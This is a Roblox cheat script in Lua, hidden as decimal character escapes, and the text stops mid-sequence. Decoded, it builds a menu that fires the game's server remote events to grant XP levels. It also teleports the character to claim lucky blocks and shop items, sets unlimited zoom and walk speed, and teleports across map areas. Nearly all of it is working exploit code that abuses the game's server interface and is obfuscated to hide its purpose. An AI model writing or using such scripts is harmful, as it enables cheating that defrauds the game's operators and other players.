"\101","\114","\118","\101","\114","\32","\83","\105","\100","\101","\100","\33","\34","\44","\32","\102","\117","\110","\99","\116","\105","\111","\110","\40","\41","\10","\9","\103","\97","\109","\101","\58","\71","\101","\116","\83","\101","\114","\118","\105","\99","\101","\40","\34","\82","\101","\112","\108","\105","\99","\97","\116","\101","\100","\83","\116","\111","\114","\97","\103","\101","\34","\41","\46","\82","\101","\109","\111","\116","\101","\115","\46","\103","\101","\110","\101","\114","\97","\116","\101","\66","\111","\111","\115","\116","\58","\70","\105","\114","\101","\83","\101","\114","\118","\101","\114","\40","\34","\76","\101","\118","\101","\108","\115","\34","\44","\32","\52","\56","\48","\44","\32","\45","\49","\41","\10","\101","\110","\100","\41","\10","\10","\78","\58","\78","\101","\119","\66","\117","\116","\116","\111","\110","\40","\34","\45","\49","\48","\32","\88","\80","\34","\44","\32","\34","\83","\101","\114","\118","\101","\114","\32","\83","\105","\100","\101","\100","\33","\34","\44","\32","\102","\117","\110","\99","\116","\105","\111","\110","\40","\41","\10","\9","\103","\97","\109","\101","\58","\71","\101","\116","\83","\101","\114","\118","\105","\99","\101","\40","\34","\82","\101","\112","\108","\105","\99","\97","\116","\101","\100","\83","\116","\111","\114","\97","\103","\101","\34","\41","\46","\82","\101","\109","\111","\116","\101","\115","\46","\103","\101","\110","\101","\114","\97","\116","\101","\66","\111","\111","\115","\116","\58","\70","\105","\114","\101","\83","\101","\114","\118","\101","\114","\40","\34","\76","\101","\118","\101","\108","\115","\34","\44","\32","\52","\56","\48","\44","\32","\45","\49","\48","\41","\10","\101","\110","\100","\41","\10","\10","\45","\45","\80","\76","\65","\89","\69","\82","\32","\84","\65","\66","\32","\66","\69","\71","\73","\78","\83","\10","\80","\108","\114","\77","\111","\100","\58","\78","\101","\119","\66","\117","\116","\116","\111","\110","\40","\34","\73","\110","\102","\105","\110","\105","\116","\101","\32","\90","\111","\111","\109","\34","\44","\32","\34","\71","\105","\118","\101","\115","\32","\117","\110","\108","\105","\109","\105","\116","\101","\100","\32","\122","\111","\111","\109","\34","\44","\32","\102","\117","\110","\99","\116","\105","\111","\110","\40","\41","\10","\9","\103","\97","\109","\101","\46","\80","\108","\97","\121","\101","\114","\115","\46","\76","\111","\99","\97","\108","\80","\108","\97","\121","\101","\114","\46","\67","\97","\109","\101","\114","\97","\77","\97","\120","\90","\111","\111","\109","\68","\105","\115","\116","\97","\110","\99","\101","\32","\61","\32","\109","\97","\116","\104","\46","\104","\117","\103","\101","\10","\9","\103","\97","\109","\101","\46","\80","\108","\97","\121","\101","\114","\115","\46","\76","\111","\99","\97","\108","\80","\108","\97","\121","\101","\114","\46","\67","\97","\109","\101","\114","\97","\77","\105","\110","\90","\111","\111","\109","\68","\105","\115","\116","\97","\110","\99","\101","\32","\61","\32","\48","\10","\101","\110","\100","\41","\10","\10","\80","\108","\114","\77","\111","\100","\58","\78","\101","\119","\66","\117","\116","\116","\111","\110","\40","\34","\67","\32","\43","\32","\67","\108","\105","\99","\107","\32","\84","\80","\34","\44","\32","\34","\84","\101","\108","\101","\112","\111","\114","\116","\115","\32","\97","\116","\32","\109","\111","\117","\115","\101","\32","\112","\111","\115","\32","\119","\104","\101","\110","\32","\99","\32","\43","\32","\99","\108","\105","\99","\107","\34","\44","\32","\102","\117","\110","\99","\116","\105","\111","\110","\40","\41","\10","\9","\108","\111","\99","\97","\108","\32","\80","\108","\97","\121","\101","\114","\32","\61","\32","\103","\97","\109","\101","\46","\80","\108","\97","\121","\101","\114","\115","\46","\76","\111","\99","\97","\108","\80","\108","\97","\121","\101","\114","\10","\9","\108","\111","\99","\97","\108","\32","\77","\111","\117","\115","\101","\32","\61","\32","\80","\108","\97","\121","\101","\114","\58","\71","\101","\116","\77","\111","\117","\115","\101","\40","\41","\10","\9","\108","\111","\99","\97","\108","\32","\85","\115","\101","\114","\73","\110","\112","\117","\116","\83","\101","\114","\118","\105","\99","\101","\32","\61","\32","\103","\97","\109","\101","\58","\71","\101","\116","\83","\101","\114","\118","\105","\99","\101","\40","\39","\85","\115","\101","\114","\73","\110","\112","\117","\116","\83","\101","\114","\118","\105","\99","\101","\39","\41","\10","\10","\9","\108","\111","\99","\97","\108","\32","\72","\111","\108","\100","\105","\110","\103","\67","\111","\110","\116","\114","\111","\108","\32","\61","\32","\102","\97","\108","\115","\101","\10","\10","\9","\77","\111","\117","\115","\101","\46","\66","\117","\116","\116","\111","\110","\49","\68","\111","\119","\110","\58","\99","\111","\110","\110","\101","\99","\116","\40","\102","\117","\110","\99","\116","\105","\111","\110","\40","\41","\10","\9","\9","\105","\102","\32","\72","\111","\108","\100","\105","\110","\103","\67","\111","\110","\116","\114","\111","\108","\32","\116","\104","\101","\110","\10","\9","\9","\9","\80","\108","\97","\121","\101","\114","\46","\67","\104","\97","\114","\97","\99","\116","\101","\114","\58","\77","\111","\118","\101","\84","\111","\40","\77","\111","\117","\115","\101","\46","\72","\105","\116","\46","\112","\41","\10","\9","\9","\101","\110","\100","\10","\9","\101","\110","\100","\41","\10","\10","\9","\85","\115","\101","\114","\73","\110","\112","\117","\116","\83","\101","\114","\118","\105","\99","\101","\46","\73","\110","\112","\117","\116","\66","\101","\103","\97","\110","\58","\99","\111","\110","\110","\101","\99","\116","\40","\102","\117","\110","\99","\116","\105","\111","\110","\40","\73","\110","\112","\117","\116","\44","\32","\80","\114","\111","\99","\101","\115","\115","\101","\100","\41","\10","\9","\9","\105","\102","\32","\73","\110","\112","\117","\116","\46","\85","\115","\101","\114","\73","\110","\112","\117","\116","\84","\121","\112","\101","\32","\61","\61","\32","\69","\110","\117","\109","\46","\85","\115","\101","\114","\73","\110","\112","\117","\116","\84","\121","\112","\101","\46","\75","\101","\121","\98","\111","\97","\114","\100","\32","\116","\104","\101","\110","\10","\9","\9","\9","\105","\102","\32","\73","\110","\112","\117","\116","\46","\75","\101","\121","\67","\111","\100","\101","\32","\61","\61","\32","\69","\110","\117","\109","\46","\75","\101","\121","\67","\111","\100","\101","\46","\67","\32","\116","\104","\101","\110","\10","\9","\9","\9","\9","\72","\111","\108","\100","\105","\110","\103","\67","\111","\110","\116","\114","\111","\108","\32","\61","\32","\116","\114","\117","\101","\10","\9","\9","\9","\101","\108","\115","\101","\105","\102","\32","\73","\110","\112","\117","\116","\46","\75","\101","\121","\67","\111","\100","\101","\32","\61","\61","\32","\69","\110","\117","\109","\46","\75","\101","\121","\67","\111","\100","\101","\46","\67","\32","\116","\104","\101","\110","\10","\9","\9","\9","\9","\72","\111","\108","\100","\105","\110","\103","\67","\111","\110","\116","\114","\111","\108","\32","\61","\32","\116","\114","\117","\101","\10","\9","\9","\9","\101","\110","\100","\10","\9","\9","\101","\110","\100","\10","\9","\101","\110","\100","\41","\10","\10","\9","\85","\115","\101","\114","\73","\110","\112","\117","\116","\83","\101","\114","\118","\105","\99","\101","\46","\73","\110","\112","\117","\116","\69","\110","\100","\101","\100","\58","\99","\111","\110","\110","\101","\99","\116","\40","\102","\117","\110","\99","\116","\105","\111","\110","\40","\73","\110","\112","\117","\116","\44","\32","\80","\114","\111","\99","\101","\115","\115","\101","\100","\41","\10","\9","\9","\105","\102","\32","\73","\110","\112","\117","\116","\46","\85","\115","\101","\114","\73","\110","\112","\117","\116","\84","\121","\112","\101","\32","\61","\61","\32","\69","\110","\117","\109","\46","\85","\115","\101","\114","\73","\110","\112","\117","\116","\84","\121","\112","\101","\46","\75","\101","\121","\98","\111","\97","\114","\100","\32","\116","\104","\101","\110","\10","\9","\9","\9","\105","\102","\32","\73","\110","\112","\117","\116","\46","\75","\101","\121","\67","\111","\100","\101","\32","\61","\61","\32","\69","\110","\117","\109","\46","\75","\101","\121","\67","\111","\100","\101","\46","\67","\32","\116","\104","\101","\110","\10","\9","\9","\9","\9","\72","\111","\108","\100","\105","\110","\103","\67","\111","\110","\116","\114","\111","\108","\32","\61","\32","\102","\97","\108","\115","\101","\10","\9","\9","\9","\101","\108","\115","\101","\105","\102","\32","\73","\110","\112","\117","\116","\46","\75","\101","\121","\67","\111","\100","\101","\32","\61","\61","\32","\69","\110","\117","\109","\46","\75","\101","\121","\67","\111","\100","\101","\46","\67","\32","\116","\104","\101","\110","\10","\9","\9","\9","\9","\72","\111","\108","\100","\105","\110","\103","\67","\111","\110","\116","\114","\111","\108","\32","\61","\32","\102","\97","\108","\115","\101","\10","\9","\9","\9","\101","\110","\100","\10","\9","\9","\101","\110","\100","\10","\9","\101","\110","\100","\41","\10","\101","\110","\100","\41","\10","\10","\80","\108","\114","\79","\116","\104","\101","\114","\58","\78","\101","\119","\66","\117","\116","\116","\111","\110","\40","\34","\79","\112","\101","\110","\32","\83","\104","\111","\112","\34","\44","\32","\34","\79","\112","\101","\110","\115","\32","\116","\104","\101","\32","\115","\104","\111","\112","\32","\109","\101","\110","\117","\34","\44","\32","\102","\117","\110","\99","\116","\105","\111","\110","\40","\41","\10","\9","\108","\111","\99","\97","\108","\32","\99","\104","\97","\114","\32","\61","\32","\103","\97","\109","\101","\46","\80","\108","\97","\121","\101","\114","\115","\46","\76","\111","\99","\97","\108","\80","\108","\97","\121","\101","\114","\46","\67","\104","\97","\114","\97","\99","\116","\101","\114","\10","\9","\108","\111","\99","\97","\108","\32","\112","\111","\115","\32","\61","\32","\99","\104","\97","\114","\46","\72","\117","\109","\97","\110","\111","\105","\100","\82","\111","\111","\116","\80","\97","\114","\116","\46","\67","\70","\114","\97","\109","\101","\10","\9","\99","\104","\97","\114","\46","\72","\117","\109","\97","\110","\111","\105","\100","\82","\111","\111","\116","\80","\97","\114","\116","\46","\67","\70","\114","\97","\109","\101","\32","\61","\32","\67","\70","\114","\97","\109","\101","\46","\110","\101","\119","\40","\45","\51","\52","\44","\32","\54","\44","\32","\45","\52","\50","\52","\41","\10","\9","\119","\97","\105","\116","\40","\41","\10","\9","\99","\104","\97","\114","\46","\72","\117","\109","\97","\110","\111","\105","\100","\82","\111","\111","\116","\80","\97","\114","\116","\46","\67","\70","\114","\97","\109","\101","\32","\61","\32","\112","\111","\115","\10","\101","\110","\100","\41","\10","\10","\80","\108","\114","\79","\116","\104","\101","\114","\58","\78","\101","\119","\66","\117","\116","\116","\111","\110","\40","\34","\67","\108","\97","\105","\109","\32","\76","\117","\99","\107","\121","\32","\66","\108","\111","\99","\107","\34","\44","\32","\34","\67","\108","\97","\105","\109","\115","\32","\116","\104","\101","\32","\108","\117","\99","\107","\121","\32","\98","\108","\111","\99","\107","\34","\44","\32","\102","\117","\110","\99","\116","\105","\111","\110","\40","\41","\10","\9","\108","\111","\99","\97","\108","\32","\99","\104","\97","\114","\32","\61","\32","\103","\97","\109","\101","\46","\80","\108","\97","\121","\101","\114","\115","\46","\76","\111","\99","\97","\108","\80","\108","\97","\121","\101","\114","\46","\67","\104","\97","\114","\97","\99","\116","\101","\114","\10","\9","\108","\111","\99","\97","\108","\32","\112","\111","\115","\32","\61","\32","\99","\104","\97","\114","\46","\72","\117","\109","\97","\110","\111","\105","\100","\82","\111","\111","\116","\80","\97","\114","\116","\46","\67","\70","\114","\97","\109","\101","\10","\9","\99","\104","\97","\114","\46","\72","\117","\109","\97","\110","\111","\105","\100","\82","\111","\111","\116","\80","\97","\114","\116","\46","\67","\70","\114","\97","\109","\101","\32","\61","\32","\67","\70","\114","\97","\109","\101","\46","\110","\101","\119","\40","\45","\50","\46","\53","\44","\32","\51","\46","\53","\44","\32","\45","\52","\49","\56","\46","\53","\41","\10","\9","\119","\97","\105","\116","\40","\41","\10","\9","\99","\104","\97","\114","\46","\72","\117","\109","\97","\110","\111","\105","\100","\82","\111","\111","\116","\80","\97","\114","\116","\46","\67","\70","\114","\97","\109","\101","\32","\61","\32","\112","\111","\115","\10","\101","\110","\100","\41","\10","\10","\80","\108","\114","\79","\116","\104","\101","\114","\58","\78","\101","\119","\66","\117","\116","\116","\111","\110","\40","\34","\67","\108","\97","\105","\109","\32","\68","\105","\97","\109","\111","\110","\100","\32","\76","\117","\99","\107","\121","\32","\66","\108","\111","\99","\107","\34","\44","\32","\34","\67","\108","\97","\105","\109","\115","\32","\116","\104","\101","\32","\100","\105","\97","\109","\111","\110","\100","\32","\108","\117","\99","\107","\121","\32","\98","\108","\111","\99","\107","\34","\44","\32","\102","\117","\110","\99","\116","\105","\111","\110","\40","\41","\10","\9","\108","\111","\99","\97","\108","\32","\99","\104","\97","\114","\32","\61","\32","\103","\97","\109","\101","\46","\80","\108","\97","\121","\101","\114","\115","\46","\76","\111","\99","\97","\108","\80","\108","\97","\121","\101","\114","\46","\67","\104","\97","\114","\97","\99","\116","\101","\114","\10","\9","\108","\111","\99","\97","\108","\32","\112","\111","\115","\32","\61","\32","\99","\104","\97","\114","\46","\72","\117","\109","\97","\110","\111","\105","\100","\82","\111","\111","\116","\80","\97","\114","\116","\46","\67","\70","\114","\97","\109","\101","\10","\9","\99","\104","\97","\114","\46","\72","\117","\109","\97","\110","\111","\105","\100","\82","\111","\111","\116","\80","\97","\114","\116","\46","\67","\70","\114","\97","\109","\101","\32","\61","\32","\67","\70","\114","\97","\109","\101","\46","\110","\101","\119","\40","\45","\54","\57","\46","\53","\44","\32","\51","\46","\50","\44","\32","\45","\52","\57","\53","\46","\57","\41","\10","\9","\119","\97","\105","\116","\40","\41","\10","\9","\99","\104","\97","\114","\46","\72","\117","\109","\97","\110","\111","\105","\100","\82","\111","\111","\116","\80","\97","\114","\116","\46","\67","\70","\114","\97","\109","\101","\32","\61","\32","\112","\111","\115","\10","\101","\110","\100","\41","\10","\10","\80","\108","\114","\77","\111","\100","\58","\78","\101","\119","\84","\101","\120","\116","\66","\111","\120","\40","\34","\87","\97","\108","\107","\83","\112","\101","\101","\100","\34","\44","\32","\34","\84","\121","\112","\101","\32","\39","\114","\101","\39","\32","\116","\111","\32","\115","\101","\116","\32","\116","\111","\32","\100","\101","\102","\97","\117","\108","\116","\34","\44","\32","\102","\117","\110","\99","\116","\105","\111","\110","\40","\116","\120","\116","\41","\10","\9","\105","\102","\32","\116","\120","\116","\32","\61","\61","\32","\34","\114","\101","\34","\32","\116","\104","\101","\110","\10","\9","\9","\103","\97","\109","\101","\46","\80","\108","\97","\121","\101","\114","\115","\46","\76","\111","\99","\97","\108","\80","\108","\97","\121","\101","\114","\46","\67","\104","\97","\114","\97","\99","\116","\101","\114","\46","\72","\117","\109","\97","\110","\111","\105","\100","\46","\87","\97","\108","\107","\83","\112","\101","\101","\100","\32","\61","\32","\49","\53","\10","\9","\101","\108","\115","\101","\10","\9","\9","\103","\97","\109","\101","\46","\80","\108","\97","\121","\101","\114","\115","\46","\76","\111","\99","\97","\108","\80","\108","\97","\121","\101","\114","\46","\67","\104","\97","\114","\97","\99","\116","\101","\114","\46","\72","\117","\109","\97","\110","\111","\105","\100","\46","\87","\97","\108","\107","\83","\112","\101","\101","\100","\32","\61","\32","\116","\120","\116","\10","\9","\101","\110","\100","\10","\101","\110","\100","\41","\10","\10","\45","\45","\84","\69","\76","\69","\80","\79","\82","\84","\32","\84","\65","\66","\32","\66","\69","\71","\73","\78","\83","\10","\84","\112","\77","\97","\105","\110","\58","\78","\101","\119","\66","\117","\116","\116","\111","\110","\40","\34","\83","\112","\97","\119","\110","\32","\65","\114","\101","\97","\34","\44","\32","\34","\77","\97","\107","\101","\115","\32","\121","\111","\117","\32","\84","\80","\32","\116","\111","\32","\116","\104","\105","\115","\32","\108","\111","\99","\97","\116","\105","\111","\110","\34","\44","\32","\102","\117","\110","\99","\116","\105","\111","\110","\40","\41","\10","\9","\103","\97","\109","\101","\46","\80","\108","\97","\121","\101","\114","\115","\46","\76","\111","\99","\97","\108","\80","\108","\97","\121","\101","\114","\46","\67","\104","\97","\114","\97","\99","\116","\101","\114","\46","\72","\117","\109","\97","\110","\111","\105","\100","\82","\111","\111","\116","\80","\97","\114","\116","\46","\67","\70","\114","\97","\109","\101","\32","\61","\32","\67","\70","\114","\97","\109","\101","\46","\110","\101","\119","\40","\45","\52","\52","\44","\32","\54","\44","\32","\45","\52","\54","\53","\41","\10","\101","\110","\100","\41","\10","\10","\84","\112","\65","\114","\101","\97","\58","\78","\101","\119","\68","\114","\111","\112","\100","\111","\119","\110","\40","\34","\83","\101","\99","\116","\105","\111","\110","\32","\83","\101","\108","\101","\99","\116","\111","\114","\34","\44","\32","\34","\77","\97","\107","\101","\115","\32","\121","\111","\117","\32","\84","\80","\32","\116","\111","\32","\116","\104","\105","\115","\32","\108","\111","\99","\97","\116","\105","\111","\110","\34","\44","\32","\123","\34","\82","\97","\99","\101","\32","\84","\114","\97","\99","\107","\34","\44","\32","\34","\67","\111","\110","\115","\116","\114","\117","\99","\116","\105","\111","\110","\32","\83","\105","\116","\101","\34","\44","\32","\34","\70","\97","\114","\109","\34","\44","\32","\34","\72","\111","\117","\115","\101","\115","\34","\44","\32","\34","\66","\101","\97","\99","\104","\34","\44","\32","\34","\83","\112","\97","\99","\101","\32","\83","\116","\97","\116","\105","\111","\110","\34","\44","\32","\34","\80","\114","\105","\115","\111","\110","\34","\44","\32","\34","\68","\101","\115","\101","\114","\116","\34","\44","\32","\34","\67","\97","\115","\116","\108","\101","\34","\44","\32","\34","\67","\105","\116","\121","\34","\44","\32","\34","\86","\111","\108","\99","\97","\110","\111","\34","\44","\32","\34","\68","\111","\111","\109","\115","\112","\105","\114","\101","\34","\125","\44","\32","\102","\117","\110","\99","\116","\105","\111","\110","\40","\112","\105","\99","\107","\41","\10","\9","\105","\102","\32","\112","\105","\99","\107","\32","\61","\61","\32","\34","\82","\97","\99","\101","\32","\84","\114","\97","\99","\107","\34","\32","\116","\104","\101","\110","\10","\9","\9","\103","\97","\109","\101","\46","\80","\108","\97","\121","\101","\114","\115","\46","\76","\111","\99","\97","\108","\80","\108","\97","\121","\101","\114","\46","\67","\104","\97","\114","\97","\99","\116","\101","\114","\46","\72","\117","\109","\97","\110","\111","\105","\100","\82","\111","\111","\116","\80","\97","\114","\116","\46","\67","\70","\114","\97","\109","\101","\32","\61","\32","\67","\70","\114","\97","\109","\101","\46","\110","\101","\119","\40","\119","\111","\114","\107","\115","\112","\97","\99","\101","\46","\65","\114","\101","\97","\115","\46","\65","\114","\101","\97","\49","\46","\83","\112","\97","\119","\110","\115","\46","\83","\112","\97","\119","\110","\49","\46","\80","\111","\115","\105","\116","\105","\111","\110","\41","\10","\9","\101","\110","\100","\10","\9","\105","\102","\32","\112","\105","\99","\107","\32","\61","\61","\32","\34","\67","\111","\110","\115","\116","\114","\117","\99","\116","\105","\111","\110","\32","\83","\105","\116","\101","\34","\32","\116","\104","\101","\110","\10","\9","\9","\103","\97","\109","\101","\46","\80","\108","\97","\121","\101","\114","\115","\46","\76","\111","\99","\97","\108","\80","\108","\97","\121","\101","\114","\46","\67","\104","\97","\114","\97","\99","\116","\101","\114","\46","\72","\117","\109","\97","\110","\111","\105","\100","\82","\111","\111","\116","\80","\97","\114","\116","\46","\67","\70","\114","\97","\109","\101","\32","\61","\32","\67","\70","\114","\97","\109","\101","\46","\110","\101","\119","\40","\119","\111","\114","\107","\115","\112","\97","\99","\101","\46","\65","\114","\101","\97","\115","\46","\65","\114","\101","\97","\50","\46","\83","\112","\97","\119","\110","\115","\46","\83","\112","\97","\119","\110","\49","\46","\80","\111","\115","\105","\116","\105","\111","\110","\41","\10","\9","\101","\110","\100","\10","\9","\105","\102","\32","\112","\105","\99","\107","\32","\61","\61","\32","\34","\70","\97","\114","\109","\34","\32","\116","\104","\101","\110","\10","\9","\9","\103","\97","\109","\101","\46","\80","\108","\97","\121","\101","\114","\115","\46","\76","\111","\99","\97","\108","\80","\108","\97","\121","\101","\114","\46","\67","\104","\97","\114","\97","\99","\116","\101","\114","\46","\72","\117","\109","\97","\110","\111","\105","\100","\82","\111","\111","\116","\80","\97","\114","\116","\46","\67","\70","\114","\97","\109","\101","\32","\61","\32","\67","\70","\114","\97","\109","\101","\46","\110","\101","\119","\40","\119","\111","\114","\107","\115","\112","\97","\99","\101","\46","\65","\114","\101","\97","\115","\46","\65","\114","\101","\97","\51","\46","\83","\112","\97","\119","\110","\115","\46","\83","\112","\97","\119","\110","\49","\46","\80","\111","\115","\105","\116","\105","\111","\110","\41","\10","\9","\101","\110","\100","\10","\9","\105","\102","\32","\112","\105","\99","\107","\32","\61","\61","\32","\34","\72","\111","\117","\115","\101","\115","\34","\32","\116","\104","\101","\110","\10","\9","\9","\103","\97","\109","\101","\46","\80","\108","\97","\121","\101","\114","\115","\46","\76","\111","\99","\97","\108","\80","\108","\97","\121","\101","\114","\46","\67","\104","\97","\114","\97","\99","\116","\101","\114","\46","\72","\117","\109","\97","\110","\111","\105","\100","\82","\111","\111","\116","\80","\97","\114","\116","\46","\67","\70","\114","\97","\109","\101","\32","\61","\32","\67","\70","\114","\97","\109","\101","\46","\110","\101","\119","\40","\119","\111","\114","\107","\115","\112","\97","\99","\101","\46","\65","\114","\101","\97","\115","\46","\65","\114","\101","\97","\52","\46","\83","\112","\97","\119","\110","\115","\46","\83","\112","\97","\119","\110","\49","\46","\80","\111","\115","\105","\116","\105","\111","\110","\41","\10","\9","\101","\110","\100","\10","\9","\105","\102","\32","\112","\105","\99","\107","\32","\61","\61","\32","\34","\66","\101","\97","\99","\104","\34","\32","\116","\104","\101","\110","\10","\9","\9","\103","\97","\109","\101","\46","\80","\108","\97","\121","\101","\114","\115","\46","\76","\111","\99","\97","\108","\80","\108","\97","\121","\101","\114","\46","\67","\104","\97","\114","\97","\99","\116","\101","\114","\46","\72","\117","\109","\97","\110","\111","\105","\100","\82","\111","\111","\116","\80","\97","\114","\116","\46","\67","\70","\114","\97","\109","\101","\32","\61","\32","\67","\70","\114","\97","\109","\101","\46","\110","\101","\119","\40","\119","\111","\114","\107","\115","\112","\97","\99","\101","\46","\65","\114","\101","\97","\115","\46","\65","\114","\101","\97","\53","\46","\83","\112","\97","\119","\110","\115","\46","\83","\112","\97","\119","\110","\49","\46","\80","\111","\115","\105","\116","\105","\111","\110","\41","\10","\9","\101","\110","\100","\10","\9","\105","\102","\32","\112","\105","\99","\107","\32","\61","\61","\32","\34","\83","\112","\97","\99","\101","\32","\83","\116","\97","\116","\105","\111","\110","\34","\32","\116","\104","\101","\110","\10","\9","\9","\103","\97","\109","\101","\46","\80","\108","\97","\121","\101","\114","\115","\46","\76","\111","\99","\97","\108","\80","\108","\97","\121","\101","\114","\46","\67","\104","\97","\114","\97","\99","\116","\101","\114","\46","\72","\117","\109","\97","\110","\111","\105","\100","\82","\111","\111","\116","\80","\97","\114","\116","\46","\67","\70","\114","\97","\109","\101","\32","\61","\32","\67","\70","\114","\97","\109","\101","\46","\110","\101","\119","\40","\119","\111","\114","\107","\115","\112","\97","\99","\101","\46","\65","\114","\101","\97","\115","\46","\65","\114","\101","\97","\54","\46","\83","\112","\97","\119","\110","\115","\46","\83","\112","\97","\119","\110","\49","\46","\80","\111","\115","\105","\116","\105","\111","\110","\41","\10","\9","\101","\110","\100","\10","\9","\105","\102","\32","\112","\105","\99","\107","\32","\61","\61","\32","\34","\80","\114","\105","\115","\111","\110","\34","\32","\116","\104","\101","\110","\10","\9","\9","\103","\97","\109","\101","\46","\80","\108","\97","\121","\101","\114","\115","\46","\76","\111","\99","\97","\108","\80","\108","\97","\121","\101","\114","\46","\67","\104","\97","\114","\97","\99","\116","\101","\114","\46","\72","\117","\109","\97","\110","\111","\105","\100","\82","\111","\111","\116","\80","\97","\114","\116","\46","\67","\70","\114","\97","\109","\101","\32","\61","\32","\67","\70","\114","\97","\109","\101","\46","\110","\101","\119","\40","\119","\111","\114","\107","\115","\112","\97","\99","\101","\46","\65","\114","\101","\97","\115","\46","\65","\114","\101","\97","\55","\46","\83","\112","\97","\119","\110","\115","\46","\83","\112","\97","\119","\110","\49","\46","\80","\111","\115","\105","\116","\105","\111","\110","\41","\10","\9","\101","\110","\100","\10","\9","\105","\102","\32","\112","\105","\99","\107","\32","\61","\61","\32","\34","\68","\101","\115","\101","\114","\116","\34","\32","\116","\104","\101","\110","\10","\9","\9","\103","\97","\109","\101","\46","\80","\108","\97","\121","\101","\114","\115","\46","\76","\111","\99","\97","\108","\80","\108","\97","\121","\101","\114","\46","\67","\104","\97","\114","\97","\99","\116","\101","\114","\46","\72","\117","\109","\97","\110","\111","\105","\100","\82","\111","\111","\116","\80","\97","\114","\116","\46","\67","\70","\114","\97","\109","\101","\32","\61","\32","\67","\70","\114","\97","\109","\101","\46","\110","\101","\119","\40","\119","\111","\114","\107","\115","\112","\97","\99","\101","\46","\65","\114","\101","\97","\115","\46","\65","\114","\101","\97","\56","\46","\83","\112","\97","\119","\110","\115","\46","\83","\112","\97","\119","\110","\49","\46","\80","\111","\115","\105","\116","\105","\111","\110","\41","\10","\9","\101","\110","\100","\10","\9","\105","\102","\32","\112","\105","\99","\107","\32","\61","\61","\32","\34","\67","\97","\115","\116","\108","\101","\34","\32","\116","\104","\101","\110","\10","\9","\9","\103","\97","\109","\101","\46","\80","\108","\97","\121","\101","\114","\115","\46","\76","\111","\99","\97","\108","\80","\108","\97","\121","\101","\114","\46","\67","\104","\97","\114","\97","\99","\116","\101","\114","\46","\72","\117","\109","\97","\110","\111","\105","\100","\82","\111","\111","\116","\80","\97","\114","\116","\46","\67","\70","\114","\97","\109","\101","\32","\61","\32","\67","\70","\114","\97","\109","\101","\46","\110","\101","\119","\40","\119","\111","\114","\107","\115","\112","\97","\99","\101","\46","\65","\114","\101","\97","\115","\46","\65","\114","\101","\97","\57","\46","\83","\112","\97","\119","\110","\115","\46","\83","\112","\97","\119","\110","\49","\46","\80","\111","\115","\105","\116","\105","\111","\110","\41","\10","\9","\101","\110","\100","\10","\9","\105","\102","\32","\112","\105","\99","\107","\32","\61","\61","\32","\34","\67","\105","\116","\121","\34","\32","\116","\104","\101","\110","\10","\9","\9","\103","\97","\109","\101","\46","\80","\108","\97","\121","\101","\114","\115","\46","\76","\111","\99","\97","\108","\80","\108","\97","\121","\101","\114","\46","\67","\104","\97","\114","\97","\99","\116","\101","\114","\46","\72","\117","\109","\97","\110","\111","\105","\100","\82","\111","\111","\116","\80","\97","\114","\116","\46","\67","\70","\114","\97","\109","\101","\32","\61","\32","\67","\70","\114","\97","\109","\101","\46","\110","\101","\119","\40","\119","\111","\114","\107","\115","\112","\97","\99","\101","\46","\65","\114","\101","\97","\115","\46","\65","\114","\101","\97","\49","\48","\46","\83","\112","\97","\119","\110","\115","\46","\83","\112","\97","\119","\110","\49","\46","\80","\111","\115","\105","\116","\105","\111","\110","\41","\10","\9","\101","\110","\100","\10","\9","\105","\102","\32","\112","\105","\99","\107","\32","\61","\61","\32","\34","\86","\111","\108","\99","\97","\110","\111","\34","\32","\116","\104","\101","\110","\10","\9","\9","\103","\97","\109","\101","\46","\80","\108","\97","\121","\101","\114","\115","\46","\76","\111","\99","\97","\108","\80","\108","\97","\121","\101","\114","\46","\67","\104","\97","\114","\97","\99","\116","\101","\114","\46","\72","\117","\109","\97","\110","\111","\105","\100","\82","\111","\111","\116","\80","\97","\114","\116","\46","\67","\70","\114","\97","\109","\101","\32","\61","\32","\67","\70","\114","\97","\109","\101","\46","\110","\101","\119","\40","\119","\111","\114","\107","\115","\112","\97","\99","\101","\46","\65","\114","\101","\97","\115","\46","\65","\114","\101","\97","\49","\49","\46","\83","\112","\97","\119","\110","\115","\46","\83","\112","\97","\119","\110","\49","\46","\80","\111","\115","\105","\116","\105","\111","\110","\41","\10","\9","\101","\110","\100","\10","\9","\105","\102","\32","\112","\105","\99","\107","\32","\61","\61","\32","\34","\68","\111","\111","\109","\115","\112","\105","\114","\101","\34","\32","\116","\104","\101","\110","\10","\9","\9","\103","\97","\109","\101","\46","\80","\108","\97","\121","\101","\114","\115","\46","\76","\111","\99","\97","\108","\80","\108","\97","\121","\101","\114","\46","\67","\104","\97","\114","\97","\99","\116","\101","\114","\46","\72","\117","\109","\97","\110","\111","\105","\100","\82","\111","\111","\116","\80","\97","\114","\116","\46","\67","\70","\114","\97","\109","\101","\32","\61","\32","\67","\70","\114","\97","\109","\101","\46","\110","\101","\119","\40","\119","\111","\114","\107","\115","\112","\97","\99","\101","\46","\65","\114","\101","\97","\115","\46","\65","\114","\101","\97","\49","\50","\46","\83","\112","\97","\119","\110","\115","\46","\83","\112","\97","\119","\110","\49","\46","\80","\111","\115","\105","\116","\105","\111","\110","\41","\10","\9","\101","\110","\100","\10","\101","\110","\100","\41","\10","\10","\84","\112","\82","\97","\110","\107","\58","\78","\101","\119","\68","\114","\111","\112","\100","\111","\119","\110","\40","\34","\83","\101","\99","\116","\105","\111","\110","\32","\83","\101","\108","\101","\99","\116","\111","\114","\34","\44","\32","\34","\77","\97","\107","\101","\115","\32","\121","\111","\117","\32","\84","\80","\32","\116","\111","\32","\116","\104","\105","\115","\32","\108","\111","\99","\97","\116","\105","\111","\110","\34","\44","\32","\123","\34","\69","\109","\111","\106","\105","\115","\34","\44","\32","\34","\67","\104","\97","\114","\97","\99","\116","\101","\114","\115","\34","\44","\32","\34","\68","\101","\118","\105","\99","\101","\115","\34","\44","\32","\34","\82","\117","\98","\105","\107","\115","\32","\67","\117","\98","\101","\34","\125","\44","\32","\102","\117","\110","\99","\116","\105","\111","\110","\40","\112","\105","\99","\107","\41","\10","\9","\105","\102","\32","\112","\105","\99","\107","\32","\61","\61","\32","\34","\69","\109","\111","\106","\105","\115","\34","\32","\116","\104","\101","\110","\10","\9","\9","\103","\97","\109","\101","\46","\80","\108","\97","\121","\101","\114","\115","\46","\76","\111","\99","\97","\108","\80","\108","\97","\121","\101","\114","\46","\67","\104","\97","\114","\97","\99","\116","\101","\114","\46","\72","\117","\109","\97","\110","\111","\105","\100","\82","\111","\111","\116","\80","\97","\114","\116","\46","\67","\70","\114","\97","\109","\101","\32","\61","\32","\67","\70","\114","\97","\109","\1